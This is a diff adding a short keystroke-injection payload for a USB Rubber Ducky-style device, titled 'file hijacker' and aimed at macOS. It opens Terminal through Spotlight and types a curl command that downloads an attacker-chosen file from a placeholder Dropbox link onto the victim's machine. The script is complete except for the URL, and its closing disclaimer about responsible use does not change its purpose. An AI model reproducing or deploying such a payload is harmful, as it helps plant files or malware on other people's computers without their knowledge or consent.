@@ -1,0 +1,22 @@
+
+REM Author: Narsty
+REM Title: file hijacker
+REM Version 1.0 MacOs
+
+REM Replace <Your Shared link for the intended file> with the actual URL for the file you want to download.
+REM Additionally, replace file.ext with the desired name and extension for the downloaded file.
+
+
+DELAY 2000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 2000
+STRING curl -o "file.ext" "Enter dropbox File URL here"
+ENTER
+
+
+REM  It's crucial to use scripting and automation tools responsibly, following legal and ethical guidelines, and only for legitimate purposes.
+
